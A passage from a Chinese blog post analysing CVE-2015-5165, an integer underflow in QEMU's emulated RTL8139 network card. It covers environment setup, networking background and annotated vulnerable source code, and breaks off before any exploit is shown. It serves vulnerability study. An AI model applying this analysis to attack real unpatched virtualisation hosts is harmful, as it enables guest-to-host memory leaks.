    <content type="html"><![CDATA[<p>参考大佬们的文章复现CVE-2015-5165。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>宿主机环境 Ubuntu 20.10</p><h3 id="QEMU编译"><a href="#QEMU编译" class="headerlink" title="QEMU编译"></a>QEMU编译</h3><p>QEMU <a href="https://github.com/qemu/qemu/tree/bd80b5963f58c601f31d3186b89887bf8e182fb5">commit-bd80b59</a>源码下载。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> unzip qemu.zip</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>如果出现以下错误，给文件 <code>commands-posix.c</code> 增加头文件 <code>&lt;sys/sysmacros.h&gt;</code> 即可解决。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor&#x27;:</span><br><span class="line">/repo/qemu/qga/commands-posix.c:640: undefined reference to `major&#x27;</span><br><span class="line">/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor&#x27;</span><br></pre></td></tr></table></figure><h3 id="制作QEMU虚拟机"><a href="#制作QEMU虚拟机" class="headerlink" title="制作QEMU虚拟机"></a>制作QEMU虚拟机</h3><p>这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击<a href="https://mirrors6.tuna.tsinghua.edu.cn/ubuntu-releases/xenial/ubuntu-16.04.6-server-i386.iso">下载</a>。</p><p>还需要下载安装VNC-Viewer，稍后会用到。<a href="https://www.realvnc.com/en/connect/download/viewer/linux/">链接</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \  <span class="comment"># 能用嵌套虚拟就用(添加--enable-kvm)</span></span></span><br><span class="line">~/tmp/iso/ubuntu-16.04.6-server-i386.iso \</span><br><span class="line">-hda ~/tmp/vm/ubuntu.img -m 1024</span><br><span class="line"><span class="meta">$</span><span class="bash"> vncviewer host:port  <span class="comment"># 连接上，安装就好</span></span></span><br></pre></td></tr></table></figure><p>（尽量使用–enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）</p><a id="more"></a><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>因为涉及到了网卡，而且产生漏洞是数据包长度溢出所导致，所以需要了解一定的网络知识，可以看下面来复习一下。</p><p>OSI(Open Systems Interconnection)将网络协议分为7层，从上往下依次是：</p><ul><li>应用层</li><li>表示层</li><li>会话层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><p>而现实中使用的TCP/IP协议是5层的，依次是：</p><ol><li><p>应用层，是网络应用程序及其应用层协议存留的地方。因特网的应用层包括许多协议，常见的有HTTP(它为web文档提供了请求和传送)、SMTP(它提供了电子邮件报文的传输)和FTP(它提供了两个端系统之间的文件传送)。</p></li><li><p>传输层，负责为信源和信宿提供应用程序<strong>进程</strong>（包括同一终端上的不同进程）间的数据传输服务，这一层上主要定义了两个传输协议，传输控制协议即TCP和用户数据报协议UDP。</p></li><li><p>网络层，负责将数据报独立地从信源发送到信宿，主要解决路由选择、拥塞控制和网络互联等问题。</p></li><li><p>数据链路层，负责将IP数据报封装成合适在物理网络上传输的帧格式并传输，或将从物理网络接收到的帧解封，取出IP数据报交给网络层。</p></li><li><p>物理层，负责将<strong>比特流</strong>在结点间传输，即负责物理传输。该层的协议既与链路有关也与传输介质有关。</p></li></ol><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgTCPIP.jpg" alt="TCPIP"></p><p>IP数据包(IPv4)头部长度为20-60字节，TCP报文头部长度也是20-60字节。</p><h4 id="以太网帧"><a href="#以太网帧" class="headerlink" title="以太网帧"></a>以太网帧</h4><p>在以太网链路上的数据包称作以太帧。以太帧起始部分由前导码和帧开始符组成。后面紧跟着一个以太网报头，以MAC地址说明目的地址和源地址。帧的中部是该帧负载的包含其他协议报头的数据包(例如IP协议)。以太帧由一个32位冗余校验码结尾。它用于检验数据传输是否出现损坏。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgEthernetFrame.png" alt="EthernetFrame"></p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>前同步码</td><td>用来使接收端的适配器在接收 MAC 帧时能够迅速调整时钟频率，使它和发送端的频率相同。前同步码为 7 个字节，1 和 0 交替。</td></tr><tr><td>帧开始定界符</td><td>帧的起始符，为 1 个字节。前 6 位 1 和 0 交替，最后的两个连续的 1 表示告诉接收端适配器：“帧信息要来了，准备接收”。</td></tr><tr><td>目的地址</td><td>接收帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。作用是当网卡接收到一个数据帧时，首先会检查该帧的目的地址，是否与当前适配器的物理地址相同，如果相同，就会进一步处理；如果不同，则直接丢弃。</td></tr><tr><td>源地址</td><td>发送帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。</td></tr><tr><td>类型</td><td>上层协议的类型。由于上层协议众多，所以在处理数据的时候必须设置该字段，标识数据交付哪个协议处理。例如，字段为 0x0800 时，表示将数据交付给 IP 协议。</td></tr><tr><td>数据</td><td>也称为效载荷，表示交付给上层的数据。以太网帧数据长度最小为 46 字节，最大为 1500 字节。如果不足 46 字节时，会填充到最小长度。最大值也叫最大传输单元（MTU）。  在 Linux 中，使用 ifconfig 命令可以查看该值，通常为 1500。</td></tr><tr><td>帧检验序列 FCS</td><td>检测该帧是否出现差错，占 4 个字节（32 比特）。发送方计算帧的循环冗余码校验（CRC）值，把这个值写到帧里。接收方计算机重新计算 CRC，与 FCS 字段的值进行比较。如果两个值不相同，则表示传输过程中发生了数据丢失或改变。这时，就需要重新传输这一帧。</td></tr></tbody></table><h4 id="IP数据报"><a href="#IP数据报" class="headerlink" title="IP数据报"></a>IP数据报</h4><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgipdata.png" alt="ipdata"></p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>版本号</td><td>占用4位二进制数，表示该IP数据报使用的IP协议版本。目前Internet中使用的主要是TCP/IP协议族中版本号为4的IP协议。</td></tr><tr><td>首部长度</td><td>占用4位二进制位，此域指出整个报头的长度（包括选项），该长度是<strong>以32位二进制数为一个计数单位</strong>的，接收端通过此域可以计算出报头在何处结束及从何处开始读数据。普通IP数据报（没有任何选项）该字段的值是5（即20个字节的长度）。</td></tr><tr><td>服务类型(TOS, Type Of Service)</td><td>占用8位二进制位，用于规定本数据报的处理方式。</td></tr><tr><td>总长度</td><td>占用16位二进制位，总长度字段是指整个IP数据报的长度（报头区+数据区），以字节为单位。</td></tr><tr><td>标识</td><td>占16位（第二行四个字节中1~15位），它是一个计数器，用来产生数据报的标识，即每产生一个数据报贴上一个标识。</td></tr><tr><td>标志</td><td>目前只有前两位有意义。<br/>标志字段的最低位是 <strong>MF</strong> (More Fragment)。MF = 1 表示后面“还有分片”。<strong>MF</strong> = 0 表示最后一个分片。<br/>标志字段中间的一位是 <strong>DF</strong> (Don’t Fragment) 。只有当 DF = 0 时才允许分片。</td></tr><tr><td>片偏移</td><td>较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。</td></tr><tr><td>TTL</td><td>Time To Live，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。</td></tr></tbody></table><h3 id="RTL8139"><a href="#RTL8139" class="headerlink" title="RTL8139"></a>RTL8139</h3><p>RTL8139被用在许多古老或者廉价的设备中，支持10/100MBit。支持的速率较慢，但由于它的简洁性，如今它广泛被用在虚拟化环境中。这也使得它的驱动程序比较简单，所以通常是OS开发爱好者们的第一个设备。它支持两种接收发送(Receive/Transmit)模式：C mode和C+ mode。vender ID: 0x10EC，device ID: 0x8139。</p><p>QEMU中模拟的RTL8139，对应的结构为<code>RTL8139State</code>(位于文件<code>hw/net/rtl8139.c:435</code>)。</p><p><code>RTL8139State</code>结构体中许多的字段就是RTL8139网卡内部的寄存器，关于这些寄存器的描述，可以参考厂商Realtek提供的Datesheet。下图为RTL8139在C+模式下寄存器的介绍：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x00    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x10    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line">0x20    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line">0x30    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line">0x40    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line">0xd0    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line">0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure><ul><li>TxConfig：发送数据相关的配置参数</li><li>RxConfig：接收数据相关的配置参数</li><li>CpCmd：C+ 模式相关配置参数，比如：<ul><li>CplusRxEnd 表示启用接收</li><li>CplusTxEnd 表示启用发送</li></ul></li><li>TxAddr0：Tx descriptors table 相关的物理内存地址<ul><li>0x20 ~ 0x27：Transmit Normal Priority Descriptors Start Address</li><li>0x28 ~ 0x2F：Transmit High Priority Descriptors Start Address</li></ul></li><li>RxRingAddrLO：Rx descriptors table 物理内存地址低 32 位</li><li>RxRingAddrHI：Rx descriptors table 物理内存地址高 32 位</li><li>TxPoll：让网卡检查 Tx descriptors</li></ul><p>关于 <code>Descriptor</code>(<strong>Tx缓冲区是网卡的发送数据缓冲区，而Rx缓冲区则是接收数据缓冲区。Tx表以及Rx表为一个16字节结构体大小的数组，该表中的<code>Descriptor</code>包含缓冲区的具体位置)</strong> 的定义，同样可以参考厂商 Realtek 提供的 Datasheet 手册，下图为 <code>Transmit Descriptor</code> 的定义：</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgrtl8139_txdescriptor.png" alt="rtl8139_txdescriptor"></p><p>Phrack的文章[4]中将其定义为（这是为了方便设置的，QEMU中并不存在这个结构）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现网卡的C+模式中，文件位于<code>hw/net/rtl8139.c:1827</code>中的函数<code>rtl8139_cplus_transmit_one</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_cplus_transmit_one</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line">    <span class="comment">/* Now decide if descriptor being processed is holding the last segment of packet */</span></span><br><span class="line">    <span class="keyword">if</span> (txdw0 &amp; CP_TX_LS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">uint8_t</span> *saved_buffer  = s-&gt;cplus_txbuffer;</span><br><span class="line">        <span class="keyword">int</span>      saved_size    = s-&gt;cplus_txbuffer_offset;</span><br><span class="line">        <span class="keyword">int</span>      saved_buffer_len = s-&gt;cplus_txbuffer_len;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN))</span><br><span class="line">        &#123;</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode offloaded task checksum\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* ip packet header */</span></span><br><span class="line">            ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 这里saved_buffer其实就是以太网帧</span></span><br><span class="line">            <span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line">            <span class="keyword">if</span> (proto == ETH_P_IP)  <span class="comment">// 检查以太网中的Type，即上层协议类型</span></span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">&quot;+++ C+ mode has IP packet\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* not aligned */</span></span><br><span class="line">                <span class="comment">// 跳过以太网帧头，到达IP数据报</span></span><br><span class="line">                eth_payload_data = saved_buffer + ETH_HLEN;</span><br><span class="line">                eth_payload_len  = saved_size   - ETH_HLEN;</span><br><span class="line"></span><br><span class="line">                ip = (ip_header*)eth_payload_data;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">                    DPRINTF(<span class="string">&quot;+++ C+ mode packet has bad IP version %d &quot;</span></span><br><span class="line">                        <span class="string">&quot;expected %d\n&quot;</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">                        IP_HEADER_VERSION_4);</span><br><span class="line">                    ip = <span class="literal">NULL</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    hlen = IP_HEADER_LENGTH(ip);</span><br><span class="line">                    ip_protocol = ip-&gt;ip_p;</span><br><span class="line">                    <span class="comment">// vulnerability here</span></span><br><span class="line">                    <span class="comment">// 完全信任了用户所提供的IP数据报的头长度和数据长度</span></span><br><span class="line">                    <span class="comment">// ip_data_len为uint16_t类型</span></span><br><span class="line">                    <span class="comment">// 当be16_to_cpu(ip-&gt;ip_len) &lt; hlen时，就会发生溢出</span></span><br><span class="line">                    <span class="comment">// 最大0xFFFF</span></span><br><span class="line">                    ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数中，计算IP数据报的数据长度时，没有对总长度<code>ip-&gt;ip_len</code>和头长度<code>hlen</code>进行校验，在恶意构造为<code>ip-&gt;ip_len &lt; heln</code>时，就会发生溢出。在此函数中的后面，因为长度过长就会使用<code>rtl8139_transfer_frame</code>进行分片发送：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_cplus_transmit_one</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line">    <span class="keyword">if</span> ((txdw0 &amp; CP_TX_LGSEN) &amp;&amp; ip_protocol == IP_PROTO_TCP)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> large_send_mss = (txdw0 &gt;&gt; <span class="number">16</span>) &amp; CP_TC_LGSEN_MSS_MASK;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;+++ C+ mode offloaded task TSO MTU=%d IP data %d &quot;</span></span><br><span class="line">                <span class="string">&quot;frame data %d specified MSS=%d\n&quot;</span>, ETH_MTU,</span><br><span class="line">                ip_data_len, saved_size - ETH_HLEN, large_send_mss);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> tcp_send_offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> send_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maximum IP header length is 60 bytes */</span></span><br><span class="line">        <span class="keyword">uint8_t</span> saved_ip_header[<span class="number">60</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* save IP header template; data area is used in tcp checksum calculation */</span></span><br><span class="line">        <span class="built_in">memcpy</span>(saved_ip_header, eth_payload_data, hlen);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a placeholder for checksum calculation routine in tcp case */</span></span><br><span class="line">        <span class="keyword">uint8_t</span> *data_to_checksum     = eth_payload_data + hlen - <span class="number">12</span>;</span><br><span class="line">        <span class="comment">//                    size_t   data_to_checksum_len = eth_payload_len  - hlen + 12;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* pointer to TCP header */</span></span><br><span class="line">        tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line">        <span class="comment">// 这里利用了上面计算得出的ip_data_len</span></span><br><span class="line">        <span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line">        <span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;+++ C+ mode TSO IP data len %d TCP hlen %d TCP &quot;</span></span><br><span class="line">                <span class="string">&quot;data len %d TCP chunk size %d\n&quot;</span>, ip_data_len,</span><br><span class="line">                tcp_hlen, tcp_data_len, tcp_chunk_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* note the cycle below overwrites IP header data,</span></span><br><span class="line"><span class="comment">                       but restores it from saved_ip_header before sending packet */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里利用tcp_data_len进行tcp数据包的分片</span></span><br><span class="line">        <span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">            <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">            &#123;</span><br><span class="line">                is_last_frame = <span class="number">1</span>;</span><br><span class="line">                chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO TCP seqno %08x\n&quot;</span>,</span><br><span class="line">                    be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">            <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO calculating TCP checksum for &quot;</span></span><br><span class="line">                    <span class="string">&quot;packet with %d bytes data\n&quot;</span>, tcp_hlen +</span><br><span class="line">                    chunk_size);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* keep PUSH and FIN flags only for the last frame */</span></span><br><span class="line">            <span class="keyword">if</span> (!is_last_frame)</span><br><span class="line">            &#123;</span><br><span class="line">                TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* recalculate TCP checksum */</span></span><br><span class="line">            ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum;</span><br><span class="line">            p_tcpip_hdr-&gt;zeros      = <span class="number">0</span>;</span><br><span class="line">            p_tcpip_hdr-&gt;ip_proto   = IP_PROTO_TCP;</span><br><span class="line">            p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">            p_tcp_hdr-&gt;th_sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + <span class="number">12</span>);</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO TCP checksum %04x\n&quot;</span>,</span><br><span class="line">                    tcp_checksum);</span><br><span class="line"></span><br><span class="line">            p_tcp_hdr-&gt;th_sum = tcp_checksum;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* restore IP header */</span></span><br><span class="line">            <span class="built_in">memcpy</span>(eth_payload_data, saved_ip_header, hlen);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* set IP data length and recalculate IP checksum */</span></span><br><span class="line">            ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* increment IP id for subsequent frames */</span></span><br><span class="line">            ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id));</span><br><span class="line"></span><br><span class="line">            ip-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">            ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen);</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO IP header len=%d &quot;</span></span><br><span class="line">                    <span class="string">&quot;checksum=%04x\n&quot;</span>, hlen, ip-&gt;ip_sum);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">            DPRINTF(<span class="string">&quot;+++ C+ mode TSO transferring packet size &quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, tso_send_size);</span><br><span class="line">            <span class="comment">// 将分片后的数据使用rtl8139_transfer_frame进行发送</span></span><br><span class="line">            rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">                                   <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">            p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">            ++send_count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Stop sending this frame */</span></span><br><span class="line">        saved_size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span 